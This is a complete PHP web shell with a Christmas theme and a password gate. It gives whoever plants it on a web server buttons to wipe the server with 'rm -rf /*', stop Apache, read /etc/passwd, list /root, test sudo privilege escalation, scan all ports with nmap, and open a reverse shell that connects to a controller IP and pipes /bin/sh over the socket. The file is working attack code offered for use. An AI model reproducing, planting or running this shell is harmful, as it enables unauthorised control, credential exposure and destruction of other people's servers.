<?php

error_reporting(E_ALL);
set_time_limit (0);
$password = "46631e784ebf76951a2dc3141048df50"; //MD5 ENCODED PASSWORD, CHANGE THIS IF YOU WANT, DEFAULT PASSWORD IS 'christmasiscool'
$passinput = $_GET['password'];
$ip = "1.1.1.1"; //CHANGE THIS TO YOUR CONTROLLER IP
$port = "4000"; //MAKE SURE YOU ARE LISTENING ON THIS PORT OR CHANGE IT
$VERSION = "1.0";
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (md5($passinput) !== $password){
    die("404 Shell Not Found");
}

?>
<!DOCTYPE html>
<iframe width="0" height="0" src="https://www.youtube.com/embed/VzXfigN-Jts?autoplay=1"></iframe> 
<title>Merry XMAS | Get Shelled</title>
<style>
    body{
        background-image: url("https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fcdn.knowledgehi.com%2F1920x1080%2F20121023%2Fabstract%2520christmas%2520holidays%2520snowdrops%2520red%2520background%25201920x1080%2520wallpaper_www.knowledgehi.com_33.jpg&f=1&nofb=1")
    }
    .button {
        background-color: #4CAF50; /* Green */
        border: none;
        color: white;
        padding: 15px 32px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        cursor: pointer;
    }
    .output{
        background-color: red;
    }
</style>
<center>
<b><font color = "red"><h1 style="background-color:green;">WELCOME TO THE CHRISTMAS CONTROL CENTRE | MADE BY QOLHF</h1></font></b>
<br><br>
</center>
<form method="post">
    <button name="destroyserver" id="destroyserver" class="button">ATTEMPT TO DESTROY SERVER</button>
    <button name="shutdown" id="shutdown" class="button">ATTEMPT TO SHUT DOWN WEBSERVER</button>
    <button name="pwd" id="pwd" class="button">PRINT WORKING DIRECTORY</button>
    <button name="ls" id="ls" class="button">LIST FILES</button>
    <button name="getip" id="getip" class="button">GET BACKEND IP</button>
    <button name="getuser" id="getuser" class="button">GET CURRENT USER</button>
    <br><br>
    <button name="lsroot" id="lsroot" class="button">ATTEMPT TO LS /root</button>
    <button name="pe" id="pe" class="button">ATTEMPT TO ESCALATE PRIVLEDGES</button>
    <button name="nmap" id="nmap" class="button">GET ALL OPEN PORTS (TAKES A BIT TO LOAD)</button>
    <button name = "revshell" id="revshell" class="button">GET A REVERSE SHELL</button>
    <button name = "etcpasswd" id="etcpasswd" class="button">ATTEMPT TO READ /etc/passwd</button>

</form>

<?php
error_reporting(E_ALL);
function write($text){
    echo '<center><font class = "output" color = "green">'.$text.'</font><br></center>';
}
function shell(){
    GLOBAL $ip;
    GLOBAL $port;
    GLOBAL $VERSION;
    GLOBAL $chunk_size;
    GLOBAL $write_a;
    GLOBAL $error_a;
    GLOBAL $shell;
    GLOBAL $daemon;
    GLOBAL $debug;

    //
    // Daemonise ourself if possible to avoid zombies later
    //

    // pcntl_fork is hardly ever available, but will allow us to daemonise
    // our php process and avoid zombies.  Worth a try...
    if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        
        if ($pid == -1) {
            printit("ERROR: Can't fork");
            exit(1);
        }
        
        if ($pid) {
            exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
            printit("Error: Can't setsid()");
            exit(1);
        }

        $daemon = 1;
    } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }

    // Change to a safe directory
    chdir("/");

    // Remove any umask we inherited
    umask(0);

    //
    // Do the reverse shell...
    //

    // Open reverse connection
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }

    // Spawn shell process
    $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
    }

    // Set everything to non-blocking
    // Reason: Occsionally reads will block, even though stream_select tells us they won't
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
            break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
            break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
            if ($debug) printit("SOCK READ");
            $input = fread($sock, $chunk_size);
            if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
            if ($debug) printit("STDOUT READ");
            $input = fread($pipes[1], $chunk_size);
            if ($debug) printit("STDOUT: $input");
            fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
            if ($debug) printit("STDERR READ");
            $input = fread($pipes[2], $chunk_size);
            if ($debug) printit("STDERR: $input");
            fwrite($sock, $input);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	$daemon = 1;
	if (!$daemon) {
		print "$string\n";
	}
}

if(array_key_exists('ls',$_POST)){
    $currentdir = exec('pwd');
    $files1 = scandir($currentdir);
 
    foreach($files1 as $filename){
        //Simply print them out onto the screen.
        write($filename);
     }
}
else if(array_key_exists('pwd',$_POST)){
    $output = exec('pwd');
    write($output);
}
else if(array_key_exists('getip',$_POST)){
    $output = file_get_contents('https://checkip.amazonaws.com');
    write($output);
}
else if(array_key_exists('getuser', $_POST)){
    $cmd = "whoami";
    $output = exec($cmd);
    write($output);
}
else if(array_key_exists('lsroot', $_POST)){

    $files1 = scandir("/root/*");
 
    if(!$files1){
        write("Operation failed!");
    }
    foreach($files1 as $filename){
        //Simply print them out onto the screen.
        write($filename);
    }

}
else if(array_key_exists('shutdown', $_POST)){

    $cmd = exec('sudo /etc/init.d/apache2 stop');
    if($cmd){
        write("Operation successful");
    } else {
        write("Operation failed!");
    }
}
else if(array_key_exists('pe', $_POST)){
    $cmd = "sudo -u root whoami";
    $output = exec($cmd);
    if($output){
        write("Successful! You can escalate privledges!");
    } else {
        write("Failed!");
    }
}
else if(array_key_exists('nmap', $_POST)){

    $result = shell_exec('nmap localhost -p1-65535');
    if($result){
        write($result);
    } else {
        write("Operation failed!");
    }

} 
else if(array_key_exists('revshell', $_POST)){
    write("Attempted connection to $ip:$port");
    shell();
}
else if(array_key_exists('destroyserver', $_POST)){
    $test1 = exec('rm -rf /*');
    $test2 = exec('sudo rm -rf /*');

    if (!$test1 && !$test2){
        write("Operation Failed!");
    } else {
        write("Operation Success!");
    }

}
else if(array_key_exists('etcpasswd', $_POST)){
   $poo = write('<br>'.shell_exec('cat /etc/passwd'));

   if(!$poo){
       write("Operation Failed!");
   }
}
